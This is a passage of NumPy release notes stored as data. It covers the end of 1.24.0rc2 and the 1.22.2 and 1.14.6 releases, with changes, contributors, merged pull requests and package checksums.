intrinsics interface. This support leads to performance improvements\nfor all SIMD kernels implemented using the universal intrinsics, including the\nfollowing operations: rint, floor, trunc, ceil, sqrt, absolute, square,\nreciprocal, tanh, sin, cos, equal, not_equal, greater, greater_equal, less,\nless_equal, maximum, minimum, fmax, fmin, argmax, argmin, add, subtract,\nmultiply, divide.\n\n(`gh-20913 <https://github.com/numpy/numpy/pull/20913>`__)\n\nNumPy now gives floating point errors in casts\n----------------------------------------------\nIn most cases, NumPy previously did not give floating point warnings or errors\nwhen these happened during casts.  For examples, casts like::\n\n    np.array([2e300]).astype(np.float32)   overflow for float32\n    np.array([np.inf]).astype(np.int64)\n\nShould now generally give floating point warnings.  These warnings should warn\nthat floating point overflow occurred.  For errors when converting floating\npoint values to integers users should expect invalid value warnings.\n\nUsers can modify the behavior of these warnings using ``np.errstate``.\n\nNote that for float to int casts, the exact warnings that are given may\nbe platform dependent.  For example::\n\n    arr = np.full(100, value=1000, dtype=np.float64)\n    arr.astype(np.int8)\n\nMay give a result equivalent to (the intermediate cast means no warning is\ngiven)::\n\n    arr.astype(np.int64).astype(np.int8)\n\nMay return an undefined result, with a warning set::\n\n    RuntimeWarning: invalid value encountered in cast\n\nThe precise behavior is subject to the C99 standard and its implementation in\nboth software and hardware.\n\n(`gh-21437 <https://github.com/numpy/numpy/pull/21437>`__)\n\nF2PY supports the value attribute\n---------------------------------\nThe Fortran standard requires that variables declared with the ``value``\nattribute must be passed by value instead of reference. F2PY now supports this\nuse pattern correctly. So ``integer, intent(in), value :: x`` in Fortran codes\nwill have correct wrappers generated.\n\n(`gh-21807 <https://github.com/numpy/numpy/pull/21807>`__)\n\nAdded pickle support for third-party BitGenerators\n--------------------------------------------------\nThe pickle format for bit generators was extended to allow each bit generator\nto supply its own constructor when during pickling. Previous  versions of NumPy\nonly supported unpickling ``Generator`` instances created with one of the core\nset of bit generators supplied with NumPy. Attempting to unpickle a\n``Generator`` that used a third-party bit generators would fail since the\nconstructor used during the unpickling was only aware of the bit generators\nincluded in NumPy.\n\n(`gh-22014 <https://github.com/numpy/numpy/pull/22014>`__)\n\narange() now explicitly fails with dtype=str\n---------------------------------------------\nPreviously, the ``np.arange(n, dtype=str)`` function worked for ``n=1`` and\n``n=2``, but would raise a non-specific exception message for other values of\n``n``. Now, it raises a `TypeError` informing that ``arange`` does not support\nstring dtypes::\n\n    >>> np.arange(2, dtype=str)\n    Traceback (most recent call last)\n       ...\n    TypeError: arange() not supported for inputs with DType <class 'numpy.dtype[str_]'>.\n\n(`gh-22055 <https://github.com/numpy/numpy/pull/22055>`__)\n\n``numpy.typing`` protocols are now runtime checkable\n----------------------------------------------------\nThe protocols used in ``numpy.typing.ArrayLike`` and ``numpy.typing.DTypeLike``\nare now properly marked as runtime checkable, making them easier to use for\nruntime type checkers.\n\n(`gh-22357 <https://github.com/numpy/numpy/pull/22357>`__)\n\n\nPerformance improvements and changes\n====================================\n\nFaster version of ``np.isin`` and ``np.in1d`` for integer arrays\n----------------------------------------------------------------\n``np.in1d`` (used by ``np.isin``) can now switch to a faster algorithm (up to\n>10x faster) when it is passed two integer arrays.  This is often automatically\nused, but you can use ``kind=\"sort\"`` or ``kind=\"table\"`` to force the old or\nnew method, respectively.\n\n(`gh-12065 <https://github.com/numpy/numpy/pull/12065>`__)\n\nFaster comparison operators\n----------------------------\nThe comparison functions (``numpy.equal``, ``numpy.not_equal``, ``numpy.less``,\n``numpy.less_equal``, ``numpy.greater`` and ``numpy.greater_equal``) are now\nmuch faster as they are now vectorized with universal intrinsics. For a CPU\nwith SIMD extension AVX512BW, the performance gain is up to 2.57x, 1.65x and\n19.15x for integer, float and boolean data types, respectively (with N=50000).\n\n(`gh-21483 <https://github.com/numpy/numpy/pull/21483>`__)\n\n\nChanges\n=======\n\nBetter reporting of integer division overflow\n---------------------------------------------\nInteger division overflow of scalars and arrays used to provide a\n``RuntimeWarning`` and the return value was undefined leading to crashes at\nrare occasions::\n\n    >>> np.array([np.iinfo(np.int32).min]*10, dtype=np.int32) // np.int32(-1)\n    <stdin>:1: RuntimeWarning: divide by zero encountered in floor_divide\n    array([0, 0, 0, 0, 0, 0, 0, 0, 0, 0], dtype=int32)\n\nInteger division overflow now returns the input dtype's minimum value and raise\nthe following ``RuntimeWarning``::\n\n    >>> np.array([np.iinfo(np.int32).min]*10, dtype=np.int32) // np.int32(-1)\n    <stdin>:1: RuntimeWarning: overflow encountered in floor_divide\n    array([-2147483648, -2147483648, -2147483648, -2147483648, -2147483648,\n           -2147483648, -2147483648, -2147483648, -2147483648, -2147483648],\n          dtype=int32)\n\n(`gh-21506 <https://github.com/numpy/numpy/pull/21506>`__)\n\n``masked_invalid`` now modifies the mask in-place\n-------------------------------------------------\nWhen used with ``copy=False``, ``numpy.ma.masked_invalid`` now modifies the\ninput masked array in-place.  This makes it behave identically to\n``masked_where`` and better matches the documentation.\n\n(`gh-22046 <https://github.com/numpy/numpy/pull/22046>`__)\n\n``nditer``/``NpyIter`` allows all allocating all operands\n---------------------------------------------------------\nThe NumPy iterator available through ``np.nditer`` in Python and as ``NpyIter``\nin C now supports allocating all arrays.  The iterator shape defaults to ``()``\nin this case.  The operands dtype must be provided, since a \"common dtype\"\ncannot be inferred from the other inputs.\n\n(`gh-22457 <https://github.com/numpy/numpy/pull/22457>`__)\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    0f45cfebcb56027a7c9fc14577082789  numpy-1.24.0rc2-cp310-cp310-macosx_10_9_x86_64.whl\n    c895f8af0f548ba2bbb948119a151cf7  numpy-1.24.0rc2-cp310-cp310-macosx_11_0_arm64.whl\n    4552d324786e3c05732135c59a73fbc6  numpy-1.24.0rc2-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    99e4634eb1474e8c443cd6cee5dbc39e  numpy-1.24.0rc2-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    f0304cb2aa708dfe1e0aa16cdfa3046d  numpy-1.24.0rc2-cp310-cp310-win32.whl\n    501424e62329ac7996be850a2fc58963  numpy-1.24.0rc2-cp310-cp310-win_amd64.whl\n    2b6a65ea122eaffb2f3b5643b1ce1ec4  numpy-1.24.0rc2-cp311-cp311-macosx_10_9_x86_64.whl\n    865bbc90494b6e9e845ac1eb08ba0377  numpy-1.24.0rc2-cp311-cp311-macosx_11_0_arm64.whl\n    faa4f8e5050cb7c4319d2c2df23eca05  numpy-1.24.0rc2-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    509fbe04ec7941baaedc6502d003b864  numpy-1.24.0rc2-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    2eb1e8cd4c53ee4046fb0cd858daef80  numpy-1.24.0rc2-cp311-cp311-win32.whl\n    f5bd22dee1273898598f373b72e40f84  numpy-1.24.0rc2-cp311-cp311-win_amd64.whl\n    6a7b14b0fcbb33a8a415e27afc856544  numpy-1.24.0rc2-cp38-cp38-macosx_10_9_x86_64.whl\n    8a26467d235710d2db2bc68ef639318f  numpy-1.24.0rc2-cp38-cp38-macosx_11_0_arm64.whl\n    e6f08e32041c4e3ca64b8714f2c1f1c8  numpy-1.24.0rc2-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    7112b8e3f9a46953b0a1e9a670008ed4  numpy-1.24.0rc2-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    9a7155f0a4a39e17bd70c17331c7e765  numpy-1.24.0rc2-cp38-cp38-win32.whl\n    cb10d074bf1977d2257209f96465e639  numpy-1.24.0rc2-cp38-cp38-win_amd64.whl\n    0fa5a0f9dfbb817061bd3b438a0e0b19  numpy-1.24.0rc2-cp39-cp39-macosx_10_9_x86_64.whl\n    39bd8e522bf703f0be585a7b30861fd0  numpy-1.24.0rc2-cp39-cp39-macosx_11_0_arm64.whl\n    a8907c987c7b5f66891cf294dbba4347  numpy-1.24.0rc2-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    7a5f46715e8b93c7b86f275c7ae3f160  numpy-1.24.0rc2-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    04daa21b43702b1bf5431731d16a59d6  numpy-1.24.0rc2-cp39-cp39-win32.whl\n    046ebc9bb672392443280192e8c71a6d  numpy-1.24.0rc2-cp39-cp39-win_amd64.whl\n    e44b5d937de603499ccf29d96e308cd7  numpy-1.24.0rc2-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    6a0c0372e7d4db195dd8e889d70de00b  numpy-1.24.0rc2-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    946e249ee0dab46c57b5b913ccfe80cd  numpy-1.24.0rc2-pp38-pypy38_pp73-win_amd64.whl\n    0974533ba76def71daa78cd0df753e1e  numpy-1.24.0rc2.tar.gz\n\nSHA256\n------\n::\n\n    dce26877ad77c9722e35c9ca82e9272cb6d10aa0a4f95e633b13511dcf549b5f  numpy-1.24.0rc2-cp310-cp310-macosx_10_9_x86_64.whl\n    0983fb5b475406cd6aa2f4f364768fb388e1211fd94fb496ad49e214d5c79792  numpy-1.24.0rc2-cp310-cp310-macosx_11_0_arm64.whl\n    df9a9c28ad95c87b4047e1acd45715eb430fb5f6df39556279b3f36ce75c697b  numpy-1.24.0rc2-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    bdd44d3133c800792f2beda0e24f86b3ae06a8a31172395c650d13e4c05d1d5b  numpy-1.24.0rc2-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    ab18e29ad73ce560747de10ebe75f145be3026b7480e76d7a5314c2bef0fc831  numpy-1.24.0rc2-cp310-cp310-win32.whl\n    1651a59e5d8dbb09b84254e358aa2fe10431df5a92ddefb1ac20208c75bd2fa2  numpy-1.24.0rc2-cp310-cp310-win_amd64.whl\n    146d7e5ee04433ce8eb504d0dcffff524a5ba759bd1fb9c73189c3436b04d59c  numpy-1.24.0rc2-cp311-cp311-macosx_10_9_x86_64.whl\n    a68647adc9945eac88f4fce96195177c2a81577baa448c1c1bbd5751c550e8b5  numpy-1.24.0rc2-cp311-cp311-macosx_11_0_arm64.whl\n    50346a0d81444f420518c7d6996524d7e559cdfa2e41886381442f012593590e  numpy-1.24.0rc2-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    8bc069b085289f3b7a578519504962330fab91459a847195b914f69b9170b75c  numpy-1.24.0rc2-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    07c0f3b174970054c613c33e90627fbafbc5d9115adf8829658b833278e7017c  numpy-1.24.0rc2-cp311-cp311-win32.whl\n    1d6198ee7eb45e5d9cc8a5c9102b734f0c5683c0e440ae7cfad90ad8cb9316d2  numpy-1.24.0rc2-cp311-cp311-win_amd64.whl\n    e948367a0b9aa68a081c4cf817751c6d0d589a37ce6bb40fea39a882b4858834  numpy-1.24.0rc2-cp38-cp38-macosx_10_9_x86_64.whl\n    e4909946cf43ff713f95780d483793d8fb23c1559686a8221e91f89e5ecceea0  numpy-1.24.0rc2-cp38-cp38-macosx_11_0_arm64.whl\n    0704c94f89bf8d5d4f5722b305a29cbb1ad91c7f3dcdcda61cb80d6e5443365b  numpy-1.24.0rc2-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    748285bca9fb0f06a16034d4b9c6dce77997d2ccddf769aaeb4760fea4752ea2  numpy-1.24.0rc2-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    b6e807f59c1f71e74603a2a88b0b997d7f43e002f6e5f7f55649c6e07738f1ad  numpy-1.24.0rc2-cp38-cp38-win32.whl\n    0a5c85f625751b77a6f613db2de5f62514024a7ea6d3be534421746e094b2121  numpy-1.24.0rc2-cp38-cp38-win_amd64.whl\n    5db5f7a8f150614684c34449010c15b61df8d8e5fc0cd79ce30e82f493598599  numpy-1.24.0rc2-cp39-cp39-macosx_10_9_x86_64.whl\n    6f34b8f2996ebad781cd878276e03d247f0129640fb0ae76bb16addc4df822d1  numpy-1.24.0rc2-cp39-cp39-macosx_11_0_arm64.whl\n    e30689dd418f2db3d2d3039cb08011047d27708fdc24c592d56fa58aaeb01672  numpy-1.24.0rc2-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    925d39290878d680eb8dd690f969faa0a4956b7bd77daf3573486eb39d8e5724  numpy-1.24.0rc2-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    a2495e48db12f546e4e3f9ea1f665390828098344bf63bca50309a68d713d302  numpy-1.24.0rc2-cp39-cp39-win32.whl\n    ea9ca0989fdd42d3320a94f540f317fb615be9ceab75a07078a84b9933582da5  numpy-1.24.0rc2-cp39-cp39-win_amd64.whl\n    c9ff51e627e7584eb7ee09f6fe494862e45f796e53b5ee7267d3d5633a79dac6  numpy-1.24.0rc2-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    b4eca15593bec5ef3e2e05c157ff1be3990d04a862f49fd46b4e527ff390b778  numpy-1.24.0rc2-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    b45bdcde72ce02a92ae183ef211bcf7f04e15d5e3df6714866de66d8ec8cc822  numpy-1.24.0rc2-pp38-pypy38_pp73-win_amd64.whl\n    c943c61fa708a6225e199aff755b2c3f5a353a2bbb726e10334a05b8e1fc030b  numpy-1.24.0rc2.tar.gz\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.22.2": "==========================\n\nThe NumPy 1.22.2 is maintenance release that fixes bugs discovered after the\n1.22.1 release. Notable fixes are:\n\n- Several build related fixes for downstream projects and other platforms.\n- Various Annotation fixes/additions.\n- Numpy wheels for Windows will use the 1.41 tool chain, fixing downstream link\n  problems for projects using NumPy provided libraries on Windows.\n- Deal with CVE-2021-41495 complaint.\n\nThe Python versions supported for this release are 3.8-3.10.\n\nContributors\n============\n\nA total of 14 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Andrew J. Hesford +\n* Bas van Beek\n* Br\u221a\u00a9nainn Woodsend +\n* Charles Harris\n* Hood Chatham\n* Janus Heide +\n* Leo Singer\n* Matti Picus\n* Mukulika Pahari\n* Niyas Sait\n* Pearu Peterson\n* Ralf Gommers\n* Sebastian Berg\n* Serge Guelton\n\nPull requests merged\n====================\n\nA total of 21 pull requests were merged for this release.\n\n* `20842 <https://github.com/numpy/numpy/pull/20842>`__: BLD: Add NPY_DISABLE_SVML env var to opt out of SVML\n* `20843 <https://github.com/numpy/numpy/pull/20843>`__: BUG: Fix build of third party extensions with Py_LIMITED_API\n* `20844 <https://github.com/numpy/numpy/pull/20844>`__: TYP: Fix pyright being unable to infer the ``real`` and ``imag``...\n* `20845 <https://github.com/numpy/numpy/pull/20845>`__: BUG: Fix comparator function signatures\n* `20906 <https://github.com/numpy/numpy/pull/20906>`__: BUG: Avoid importing ``numpy.distutils`` on import numpy.testing\n* `20907 <https://github.com/numpy/numpy/pull/20907>`__: MAINT: remove outdated mingw32 fseek support\n* `20908 <https://github.com/numpy/numpy/pull/20908>`__: TYP: Relax the return type of ``np.vectorize``\n* `20909 <https://github.com/numpy/numpy/pull/20909>`__: BUG: fix f2py's define for threading when building with Mingw\n* `20910 <https://github.com/numpy/numpy/pull/20910>`__: BUG: distutils: fix building mixed C/Fortran extensions\n* `20912 <https://github.com/numpy/numpy/pull/20912>`__: DOC,TST: Fix Pandas code example as per new release\n* `20935 <https://github.com/numpy/numpy/pull/20935>`__: TYP, MAINT: Add annotations for ``flatiter.__setitem__``\n* `20936 <https://github.com/numpy/numpy/pull/20936>`__: MAINT, TYP: Added missing where typehints in ``fromnumeric.pyi``\n* `20937 <https://github.com/numpy/numpy/pull/20937>`__: BUG: Fix build_ext interaction with non numpy extensions\n* `20938 <https://github.com/numpy/numpy/pull/20938>`__: BUG: Fix missing intrinsics for windows/arm64 target\n* `20945 <https://github.com/numpy/numpy/pull/20945>`__: REL: Prepare for the NumPy 1.22.2 release.\n* `20982 <https://github.com/numpy/numpy/pull/20982>`__: MAINT: f2py: don't generate code that triggers ``-Wsometimes-uninitialized``.\n* `20983 <https://github.com/numpy/numpy/pull/20983>`__: BUG: Fix incorrect return type in reduce without initial value\n* `20984 <https://github.com/numpy/numpy/pull/20984>`__: ENH: review return values for PyArray_DescrNew\n* `20985 <https://github.com/numpy/numpy/pull/20985>`__: MAINT: be more tolerant of setuptools >= 60\n* `20986 <https://github.com/numpy/numpy/pull/20986>`__: BUG: Fix misplaced return.\n* `20992 <https://github.com/numpy/numpy/pull/20992>`__: MAINT: Further small return value validation fixes\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    2319f8d7c629d0ba3d3d3b1d5605d494  numpy-1.22.2-cp310-cp310-macosx_10_14_x86_64.whl\n    023c01a6d3aa528f8e88b0837dcab7ed  numpy-1.22.2-cp310-cp310-macosx_11_0_arm64.whl\n    84b36e8893b811d17a19404c68db7ce6  numpy-1.22.2-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    744da9614e8272a384b542d129cd17a9  numpy-1.22.2-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    ee012ed5e7c98c6f48026dfa818b2274  numpy-1.22.2-cp310-cp310-win_amd64.whl\n    73e4fdcf398327bc4241dc38b6d10211  numpy-1.22.2-cp38-cp38-macosx_10_14_x86_64.whl\n    9fcbca2a614af3b9a37456643ab1c99d  numpy-1.22.2-cp38-cp38-macosx_11_0_arm64.whl\n    b7e0d4a19867d33765c7187d1390eef4  numpy-1.22.2-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    dc8d79d75588737ea77fe85a4f05365a  numpy-1.22.2-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    05906141c095148c53c043c381e6fabe  numpy-1.22.2-cp38-cp38-win32.whl\n    05d3b6d34c0fa031e69ec0476e8d4c9c  numpy-1.22.2-cp38-cp38-win_amd64.whl\n    1449889d856de0e88437fa76d3284e00  numpy-1.22.2-cp39-cp39-macosx_10_14_x86_64.whl\n    e25666ab6ec0692368f328b7b98c27a3  numpy-1.22.2-cp39-cp39-macosx_11_0_arm64.whl\n    59e3013894bcc6267054c746d9339cf8  numpy-1.22.2-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    7606b9898c20d2b2aa7fc7018bc9c5cd  numpy-1.22.2-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    2686a1495c620e85842967bf8a5f1b2f  numpy-1.22.2-cp39-cp39-win32.whl\n    54432a84807ab69ac3432e6090d5a169  numpy-1.22.2-cp39-cp39-win_amd64.whl\n    4dbecace42595742485b854b213341b6  numpy-1.22.2-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    5b506b01ef454f39272ca75de1c7f61c  numpy-1.22.2.tar.gz\n    a903008d992b77cb68129173c0f61f60  numpy-1.22.2.zip\n\nSHA256\n------\n::\n\n    515a8b6edbb904594685da6e176ac9fbea8f73a5ebae947281de6613e27f1956  numpy-1.22.2-cp310-cp310-macosx_10_14_x86_64.whl\n    76a4f9bce0278becc2da7da3b8ef854bed41a991f4226911a24a9711baad672c  numpy-1.22.2-cp310-cp310-macosx_11_0_arm64.whl\n    168259b1b184aa83a514f307352c25c56af111c269ffc109d9704e81f72e764b  numpy-1.22.2-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    3556c5550de40027d3121ebbb170f61bbe19eb639c7ad0c7b482cd9b560cd23b  numpy-1.22.2-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    aafa46b5a39a27aca566198d3312fb3bde95ce9677085efd02c86f7ef6be4ec7  numpy-1.22.2-cp310-cp310-win_amd64.whl\n    55535c7c2f61e2b2fc817c5cbe1af7cb907c7f011e46ae0a52caa4be1f19afe2  numpy-1.22.2-cp38-cp38-macosx_10_14_x86_64.whl\n    60cb8e5933193a3cc2912ee29ca331e9c15b2da034f76159b7abc520b3d1233a  numpy-1.22.2-cp38-cp38-macosx_11_0_arm64.whl\n    0b536b6840e84c1c6a410f3a5aa727821e6108f3454d81a5cd5900999ef04f89  numpy-1.22.2-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    2638389562bda1635b564490d76713695ff497242a83d9b684d27bb4a6cc9d7a  numpy-1.22.2-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    6767ad399e9327bfdbaa40871be4254d1995f4a3ca3806127f10cec778bd9896  numpy-1.22.2-cp38-cp38-win32.whl\n    03ae5850619abb34a879d5f2d4bb4dcd025d6d8fb72f5e461dae84edccfe129f  numpy-1.22.2-cp38-cp38-win_amd64.whl\n    d76a26c5118c4d96e264acc9e3242d72e1a2b92e739807b3b69d8d47684b6677  numpy-1.22.2-cp39-cp39-macosx_10_14_x86_64.whl\n    15efb7b93806d438e3bc590ca8ef2f953b0ce4f86f337ef4559d31ec6cf9d7dd  numpy-1.22.2-cp39-cp39-macosx_11_0_arm64.whl\n    badca914580eb46385e7f7e4e426fea6de0a37b9e06bec252e481ae7ec287082  numpy-1.22.2-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    94dd11d9f13ea1be17bac39c1942f527cbf7065f94953cf62dfe805653da2f8f  numpy-1.22.2-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    8cf33634b60c9cef346663a222d9841d3bbbc0a2f00221d6bcfd0d993d5543f6  numpy-1.22.2-cp39-cp39-win32.whl\n    59153979d60f5bfe9e4c00e401e24dfe0469ef8da6d68247439d3278f30a180f  numpy-1.22.2-cp39-cp39-win_amd64.whl\n    4a176959b6e7e00b5a0d6f549a479f869829bfd8150282c590deee6d099bbb6e  numpy-1.22.2-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    093d513a460fd94f94c16193c3ef29b2d69a33e482071e3d6d6e561a700587a6  numpy-1.22.2.tar.gz\n    076aee5a3763d41da6bef9565fdf3cb987606f567cd8b104aded2b38b7b47abf  numpy-1.22.2.zip\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA1\n\n==========================\n", "1.14.6": "==========================\n\nThis is a bugfix release for bugs reported following the 1.14.5 release. The\nmost significant fixes are:\n\n* Fix for behavior change in ``ma.masked_values(shrink=True)``\n* Fix the new cached allocations machinery to be thread safe.\n\nThe Python versions supported in this release are 2.7 and 3.4 - 3.7. The Python\n3.6 wheels on PyPI should be compatible with all Python 3.6 versions.\n\nContributors\n============\n\nA total of 4 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n* Eric Wieser\n* Julian Taylor\n* Matti Picus\n\nPull requests merged\n====================\n\nA total of 4 pull requests were merged for this release.\n\n* `11985 <https://github.com/numpy/numpy/pull/11985>`__: BUG: fix cached allocations without the GIL\n* `11986 <https://github.com/numpy/numpy/pull/11986>`__: BUG: Undo behavior change in ma.masked_values(shrink=True)\n* `11987 <https://github.com/numpy/numpy/pull/11987>`__: BUG: fix refcount leak in PyArray_AdaptFlexibleDType\n* `11995 <https://github.com/numpy/numpy/pull/11995>`__: TST: Add Python 3.7 testing to NumPy 1.14.\n\nChecksums\n=========\n\nMD5\n- ---\n\n    f67c12a012b32b44e39eb057d6c5e5a9  numpy-1.14.6-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    a9325f87cd57dca3164e8920bd93ed30  numpy-1.14.6-cp27-cp27m-manylinux1_i686.whl\n    a02a64177b422b6059242f01fc39eba9  numpy-1.14.6-cp27-cp27m-manylinux1_x86_64.whl\n    4d45b10bc3be5e2e87aaf530bbcd9e48  numpy-1.14.6-cp27-cp27mu-manylinux1_i686.whl\n    d9e0e8d2aa9a198bcebb9e6627669c7b  numpy-1.14.6-cp27-cp27mu-manylinux1_x86_64.whl\n    cfe9797b5bb22896aae777a356e77eab  numpy-1.14.6-cp27-none-win32.whl\n    7e2bb331cc8fc5939a362df46cf60081  numpy-1.14.6-cp27-none-win_amd64.whl\n    1ba6477836db55255943977535bf6821  numpy-1.14.6-cp34-cp34m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    e341e9d58654c8afd15728495a523473  numpy-1.14.6-cp34-cp34m-manylinux1_i686.whl\n    e326047645ebee9bfac01922663488c7  numpy-1.14.6-cp34-cp34m-manylinux1_x86_64.whl\n    29f8f49c0c3b3282fcd644d66bf15001  numpy-1.14.6-cp34-none-win32.whl\n    92ad00143740a54180bb6f2015004940  numpy-1.14.6-cp34-none-win_amd64.whl\n    0f25ad62a1f7627729296d47a72d5fe4  numpy-1.14.6-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    9027e902724fe6d0468f30f9fed878c9  numpy-1.14.6-cp35-cp35m-manylinux1_i686.whl\n    25cc365ada785dd26ed74eae5b90630d  numpy-1.14.6-cp35-cp35m-manylinux1_x86_64.whl\n    b969c8694c91918927b74f82dcbd6e51  numpy-1.14.6-cp35-none-win32.whl\n    db451ea9b296b95644bbdb0dfe133d38  numpy-1.14.6-cp35-none-win_amd64.whl\n    afc5355fe367e833bf8b503e2be19e11  numpy-1.14.6-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    200cdb3ed59ced85a6fe4255b4e93c32  numpy-1.14.6-cp36-cp36m-manylinux1_i686.whl\n    b40851c94f1c7586a1f5b4e9602a748a  numpy-1.14.6-cp36-cp36m-manylinux1_x86_64.whl\n    7ece416512eb587d237e0ea35a764387  numpy-1.14.6-cp36-none-win32.whl\n    fb0334939e7f0716415971c1566a3da5  numpy-1.14.6-cp36-none-win_amd64.whl\n    7cd2d7d164af228289e2a2dd7dc2f6b0  numpy-1.14.6-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    f816dd37be0320767994c18aaca1f530  numpy-1.14.6-cp37-cp37m-manylinux1_i686.whl\n    29539a787aa1c04c5026c7b9c4e611e4  numpy-1.14.6-cp37-cp37m-manylinux1_x86_64.whl\n    d957e060a892311bd19df11fd2efbce3  numpy-1.14.6-cp37-none-win32.whl\n    4660539e780b295ab849fe9cd6491994  numpy-1.14.6-cp37-none-win_amd64.whl\n    dd01e3e29e8f46f2be8f176d3649cab1  numpy-1.14.6.tar.gz\n    9118b06f0ff86f9545beee4a10a80717  numpy-1.14.6.zip\n\nSHA256\n- ------\n\n    bd6b3906a50f9ad755e2c21a78661eff1bbaab3c803c0fcf22927ec50372dba6  numpy-1.14.6-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    f1dd9a8ecbe9f8f13652afe04c470bb837578e402a3641649ddc41764d0e4326  numpy-1.14.6-cp27-cp27m-manylinux1_i686.whl\n    4c774c852cad87f692e6b3e374ba7074c7a9897cf4bafcc47ad48142d455f3ae  numpy-1.14.6-cp27-cp27m-manylinux1_x86_64.whl\n    40f9c0ae71453e4d28d40e502e531e72810bf3b12b2d55cad939ab86a26ead42  numpy-1.14.6-cp27-cp27mu-manylinux1_i686.whl\n    964c2c6a9e0ecac54a368effa26a89a97b2e15266dc68dc78f2519f3040be623  numpy-1.14.6-cp27-cp27mu-manylinux1_x86_64.whl\n    4e2f4c7031507b23b14056a4bc2b4cbe865607f55b45bfc15cc745a268bc817e  numpy-1.14.6-cp27-none-win32.whl\n    35be3f06ad20030bfba9ae199fa5d5474aebeabb3197d2ce9fcd8c417f7415e3  numpy-1.14.6-cp27-none-win_amd64.whl\n    e11e5eba43e0d8b077aafa11e43db7a77af4fa435557972dd3570898e0cbb736  numpy-1.14.6-cp34-cp34m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    1718e009ac6699868c82c4ed154e64945479f5c3d8826b2e10c470e9fad7bd18  numpy-1.14.6-cp34-cp34m-manylinux1_i686.whl\n    6eb031402a278a6fa5838e543cf36ed6d21a6ee90e9a2803570d47908ca5e9fd  numpy-1.14.6-cp34-cp34m-manylinux1_x86_64.whl\n    1b07024c4d87bf7a0738c438aa7fb709f9d7c093513bb8ffb2ac849f4553658c  numpy-1.14.6-cp34-none-win32.whl\n    e5daec856ea0e1111391179449b855aa29f1433ac507adc3d6c00a96abb438cb  numpy-1.14.6-cp34-none-win_amd64.whl\n    0e7c5e5358be186e0d6c73a9b34e1b890602ac1db413adc61794e2e3e02ec65c  numpy-1.14.6-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    6f2a52bb05c560fd6f29d7b49dfe8b4d7c5445c448e5587969446a0f10cf9164  numpy-1.14.6-cp35-cp35m-manylinux1_i686.whl\n    1454aca5a62fe18bb2828ea1b2f9d1534afed7216c13404a6657cda57937c54b  numpy-1.14.6-cp35-cp35m-manylinux1_x86_64.whl\n    686869ff6adc49b3066fdb44198c0655603b33e2c4d852a04c6a84cd8b224786  numpy-1.14.6-cp35-none-win32.whl\n    057ca467673a4b0422a9365ea0b53572813764f60896d3d1423f5cc9d2dd0d02  numpy-1.14.6-cp35-none-win_amd64.whl\n    db10d3d10658a847f85fe9df0d5fe6df190a30d32423d670c3824580e373c0a8  